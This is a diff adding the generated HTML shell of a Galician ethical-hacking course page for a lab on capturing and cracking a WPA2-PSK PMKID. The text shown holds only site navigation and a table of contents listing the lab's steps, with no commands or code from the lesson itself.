@@ -1,0 +1,2578 @@
+
+<!doctype html>
+<html lang="gl" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../wifite-1.3-ATAQUE_WPA2_PSK_PMF/">
+      
+      
+        <link rel="next" href="../wifite-1.4-ATAQUE_WPA2_PSK_PMKID/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>WPA2 PSK — Práctica 1.4 — PMKID - Hacking Ético - UD2 - O hacking ético nas redes sen fíos</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../css/custom.css">
+    
+      <link rel="stylesheet" href="../../../../css/opera.css">
+    
+      <link rel="stylesheet" href="../../../../css/print.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#guia-da-practica-14-captura-pmkid-en-wpa2-psk" class="md-skip">
+          Ir ao contido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabeceira">
+    <a href="../../../.." title="Hacking Ético - UD2 - O hacking ético nas redes sen fíos" class="md-header__button md-logo" aria-label="Hacking Ético - UD2 - O hacking ético nas redes sen fíos" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Hacking Ético - UD2 - O hacking ético nas redes sen fíos
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              WPA2 PSK — Práctica 1.4 — PMKID
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Cambiar a modo oscuro"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo oscuro" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="Cambiar a modo normal"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo normal" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Procura" placeholder="Procura" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Procurar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpar" aria-label="Limpar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando procura
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Pestanas" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  De interese
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../apuntamentos/ataques_contrasinais/" class="md-tabs__link">
+          
+  
+  
+  Apuntamentos
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../wifi-psk/" class="md-tabs__link">
+          
+  
+  
+  Prácticas Taller UD2
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="Hacking Ético - UD2 - O hacking ético nas redes sen fíos" class="md-nav__button md-logo" aria-label="Hacking Ético - UD2 - O hacking ético nas redes sen fíos" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Hacking Ético - UD2 - O hacking ético nas redes sen fíos
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    De interese
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Apuntamentos
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Apuntamentos
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ataques a contrasinais
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Ataques a contrasinais
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../apuntamentos/ataques_contrasinais/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Guía
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1_2" id="__nav_2_1_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ferramentas
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Ferramentas
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../apuntamentos/annex/john/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    john
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../apuntamentos/annex/hashcat/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    hashcat
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../apuntamentos/annex/hydra/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    hydra
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../apuntamentos/modo-22000/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Formato WPA*02 (hashcat modo 22000)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../apuntamentos/modo-5500/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Formato NetNTLMv1 (hashcat modo 5500)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Laboratorio vuln-wifi.lab
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Laboratorio vuln-wifi.lab
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../apuntamentos/GUIA_VISUAL_ATAQUES_WIFI_all/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Guía Visual de Ataques WiFi
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Prácticas Taller UD2
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Prácticas Taller UD2
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Wi-Fi
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Wi-Fi
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wifi-psk/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WPA2 (PSK)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wifi-eap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WPA2 (EAP)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wifi-sae/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WPA3 (SAE)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Vuln Lab Wi-Fi
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Vuln Lab Wi-Fi
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_1" id="__nav_3_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Laboratorio
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Laboratorio
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    README
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../VALIDACION-LABORATORIO/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Comprobacións do laboratorio
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SEGUIMENTO-PRACTICAS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Seguimento das prácticas
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1_4" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_1_4" id="__nav_3_2_1_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ataques específicos
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_1_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2_1_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Ataques específicos
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1.1-ATAQUE_WPA2_PSK/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WPA2 PSK — Práctica 1.1
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1.2-ATAQUE_WPA2_PSK_DEAUTH/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WPA2 PSK — Práctica 1.2 — Desautenticación
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../wifite-1.1-ATAQUE_WPA2_PSK/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    — Wifite 1.1 — WPA2 PSK — Práctica 1.1
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1.3-ATAQUE_WPA2_PSK_PMF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WPA2 PSK — Práctica 1.3 — PMF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../wifite-1.3-ATAQUE_WPA2_PSK_PMF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    — Wifite 1.3 — WPA2 PSK PMF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WPA2 PSK — Práctica 1.4 — PMKID
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WPA2 PSK — Práctica 1.4 — PMKID
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Táboa de contidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Táboa de contidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-contexto" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Contexto
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-preparacion-do-escenario-terminal-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Preparación do Escenario (Terminal 1)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-reconecemento-e-modo-monitor-terminal-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Recoñecemento e Modo Monitor (Terminal 1)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-captura-de-pmkid-terminal-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Captura de PMKID (Terminal 1)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-conversion-a-formato-hashcat-terminal-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Conversión a Formato hashcat (Terminal 1)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-cracking-con-hashcat-terminal-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. Cracking con hashcat (Terminal 1)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-comparacion-con-practica-11-handshake-tradicional" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. Comparación con Práctica 1.1 (Handshake Tradicional)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="7. Comparación con Práctica 1.1 (Handshake Tradicional)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#practica-11-handshake-4-way" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Práctica 1.1 (Handshake 4-Way):
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#practica-14-pmkid" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Práctica 1.4 (PMKID):
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-observacion-tecnica" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. Observación Técnica
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="8. Observación Técnica">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#por-que-funciona-pmkid" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Por que funciona PMKID?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#por-que-usamos-un-cliente-lexitimo-conectado-neste-laboratorio" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Por que usamos un cliente lexítimo conectado neste laboratorio?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#limitacions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Limitacións
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vantaxe-real-sobre-practica-11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vantaxe Real sobre Práctica 1.1
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-verificacion-nos-logs-opcional" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9. Verificación nos Logs (Opcional)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10-limpeza" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        10. Limpeza
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#notas-finais" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Notas Finais
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Notas Finais">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ferramentas-necesarias-xa-instaladas-en-kali" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Ferramentas Necesarias (xa instaladas en Kali)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
